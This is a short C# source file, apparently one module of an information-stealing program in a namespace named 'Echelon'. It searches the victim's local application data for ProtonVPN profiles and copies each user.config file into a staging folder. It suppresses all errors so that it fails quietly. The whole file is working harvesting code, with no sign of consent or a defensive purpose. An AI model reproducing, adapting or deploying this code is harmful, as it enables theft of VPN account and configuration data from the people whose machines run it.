

using System.IO;

namespace Echelon
{
    internal class ProtonVPN
    {
        public static int count;

        public static void GetProtonVPN(string Echelon_Dir)
        {
            try
            {
                var dir = Help.LocalData + "\\ProtonVPN";
                if (Directory.Exists(dir))
                {
                    var dirs = Directory.GetDirectories(dir + "");
                    Directory.CreateDirectory(Echelon_Dir + "\\Vpn\\ProtonVPN\\");
                    foreach (var d1rs in dirs)
                        if (d1rs.StartsWith(dir + "\\ProtonVPN" + "\\ProtonVPN.exe"))
                        {
                            var dirName = new DirectoryInfo(d1rs).Name;
                            var d1 = Directory.GetDirectories(d1rs);
                            Directory.CreateDirectory(Echelon_Dir + "\\Vpn\\ProtonVPN\\" + dirName + "\\" + new DirectoryInfo(d1[0]).Name);
                            File.Copy(d1[0] + "\\user.config", Echelon_Dir + "\\Vpn\\ProtonVPN\\" + dirName + "\\" + new DirectoryInfo(d1[0]).Name + "\\user.config");
                            count++;
                        }
                }
            }
            catch  {}

        }
    }
}
